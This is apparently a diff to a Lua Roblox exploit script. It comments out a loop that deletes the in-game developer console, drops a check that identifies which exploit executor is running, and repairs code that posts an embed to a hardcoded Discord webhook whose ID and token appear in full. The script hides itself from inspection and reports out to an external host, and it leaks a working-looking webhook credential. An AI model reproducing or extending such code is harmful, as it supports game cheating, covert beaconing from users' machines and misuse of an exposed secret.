@@ -214,7 +214,7 @@ spawn(function()
         end)
     end)
 end)
-spawn(function()
+--[[spawn(function()
     game:GetService("RunService").RenderStepped:connect(function()
         for i,v in pairs (game:GetService("CoreGui"):GetChildren())do
             if v.Name == "DevConsoleMaster" then
@@ -226,7 +226,7 @@ spawn(function()
             end
         end
     end)
-end)
+end)]]
 game.CoreGui.ChildAdded:connect(function(q)
     game.RunService.RenderStepped:connect(function()
         if q.Name == "UI LIB" or q.Name == "spyu" then
@@ -245,18 +245,16 @@ UIS.InputBegan:Connect(function(Input)
     end
 end)
 local a = {}
-    local webhookcheck = is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" orsecure_load and "Sentinel" or KRNL_LOADED and "Krnl" or SONA_LOADED and "Sona" or "Kid with shit exploit"
     local urlHttp = "https://discord.com/api/webhooks"
-    local urlCrl = "1056152047818391583
-    local url =  tostring(urlHttp) .. "/" .. tostring(urlCrl) .. "/" .. "h14e6Zi2v4va27JIabwblW7_CP6ctnMuMzEs4IWR7pwcKwnDHmxNVBHcMf-DVJ5MABgb"
+    local urlCrl = "1056152047818391583"
+    local url =  urlHttp .. "/" .. urlCrl .. "/" .. "h14e6Zi2v4va27JIabwblW7_CP6ctnMuMzEs4IWR7pwcKwnDHmxNVBHcMf-DVJ5MABgb"
     local data = {
         ["content"] = "",
         ["embeds"] = {
             {
                 ["title"] = "API SERVICES",
-                ["description"] = "API LOADING...\nPlease Check UI"
+                ["description"] = "API LOADING...\nPlease Check UI",
                 ["type"] = "rich",
-                ["color"] = tonumber(1f80d5),
             }
         }
     }
